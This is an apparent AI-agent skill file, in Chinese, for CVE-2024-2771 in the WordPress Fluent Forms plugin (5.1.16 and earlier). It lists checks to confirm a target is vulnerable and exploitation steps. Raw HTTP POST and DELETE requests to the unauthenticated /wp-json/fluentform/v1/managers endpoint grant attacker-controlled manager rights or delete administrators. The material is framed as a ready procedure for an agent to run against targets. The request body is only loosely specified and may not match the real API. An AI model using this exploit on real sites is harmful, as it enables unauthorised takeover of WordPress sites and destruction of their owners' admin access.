description: 针对 CVE-2024-2771 的详细分析与 PoC 触发技能。当你具备WordPress网站且安装了Fluent Forms插件（版本≤5.1.16）时，使用此SKILL。
---
验证漏洞存在方法
    - 检查目标WordPress网站是否安装了Fluent Forms插件，版本是否为5.1.16或更早版本
    - 尝试访问/wp-json/fluentform/v1/managers端点，查看是否无需认证即可访问

漏洞利用方法
    - 该漏洞存在于Fluent Forms插件的REST API端点/wp-json/fluentform/v1/managers中，由于缺少权限检查，未认证的攻击者可以授予用户Fluent Form管理权限
    - 攻击者可以访问所有插件设置和功能，还可以删除管理员账户
    - 漏洞利用步骤：
        1. 识别目标WordPress网站
        2. 确认Fluent Forms插件存在且版本≤5.1.16
        3. 向/wp-json/fluentform/v1/managers端点发送请求
        4. 通过该端点添加管理员权限或删除现有管理员
    
    - PoC示例（概念验证）：
        ```
        # 添加管理员权限
        POST /wp-json/fluentform/v1/managers HTTP/1.1
        Host: target-wordpress-site.com
        Content-Type: application/json
        
        {
            "action": "add_manager",
            "user_id": "attacker_user_id"
        }
        
        # 删除管理员
        DELETE /wp-json/fluentform/v1/managers/{manager_id} HTTP/1.1
        Host: target-wordpress-site.com
        ```
        
        注意：实际利用需要根据目标网站的具体配置调整参数
